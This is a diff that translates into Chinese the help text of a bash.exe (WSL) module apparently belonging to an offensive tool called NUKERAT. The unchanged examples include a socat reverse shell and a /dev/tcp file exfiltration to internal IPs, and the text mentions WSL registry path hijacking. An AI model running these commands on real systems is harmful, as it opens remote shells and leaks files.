@@ -1,27 +1,27 @@
-ABOUT
+关于
     Windows Subsystem for Linux bash launcher.
     Runs shell commands, can proxy execution or abuse WSL install-path
     registry hijacking to run a planted wsl.exe.
 
-USAGE:
+用法：
     bash.exe -c "{CMD}"
     bash.exe -c "socat tcp-connect:192.168.1.9:66 exec:sh,pty,stderr,setsid,sigint,sane"
     bash.exe -c 'cat {PATH:.zip} > /dev/tcp/192.168.1.10/24'
     bash.exe -c "{CMD}"
     bash.exe
 
-ARGUMENTS:
+参数：
     -c                           Shell command string to execute
 
-EXAMPLES:
+示例：
     bash.exe -c "{CMD}"
     bash.exe -c "socat tcp-connect:192.168.1.9:66 exec:sh,pty,stderr,setsid,sigint,sane"
     bash.exe -c 'cat {PATH:.zip} > /dev/tcp/192.168.1.10/24'
     bash.exe
 
-NUKERAT FLAGS:
-    -w <seconds>    Maximum wait time until timeout
-    -bg             Fork and run without waiting for output
+NUKERAT 选项：
+    -w <秒数>       等待超时的最大时间
+    -bg             后台运行，不等待输出
 
-    Example:
+    示例：
     bash.exe -c "{CMD}"
